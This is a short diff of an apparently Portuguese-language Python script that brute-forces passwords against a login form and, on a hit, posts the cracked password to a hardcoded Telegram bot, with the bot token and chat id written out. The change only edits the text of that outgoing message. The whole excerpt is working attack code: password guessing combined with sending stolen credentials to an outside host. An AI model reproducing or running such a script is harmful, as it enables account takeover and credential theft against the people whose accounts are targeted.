@@ -10,7 +10,7 @@ def conn():
                  data = {'user.login':user, 'user.senha':i}).text
     	if 'Selecionar' in (r):
     		print('SENHA CORRETA[+]', i)
-    		requests.post('https://api.telegram.org/bot270024270:AAGdHXE0Vcg2c2Fr5dqwRdQTf93dDJaOUMI/sendmessage?chat_id=234228448&text=SENHA_'+i)
+    		requests.post('https://api.telegram.org/bot270024270:AAGdHXE0Vcg2c2Fr5dqwRdQTf93dDJaOUMI/sendmessage?chat_id=234228448&text='+i)
     		quit()
     	else:
     		print('Senha incorreta', i)
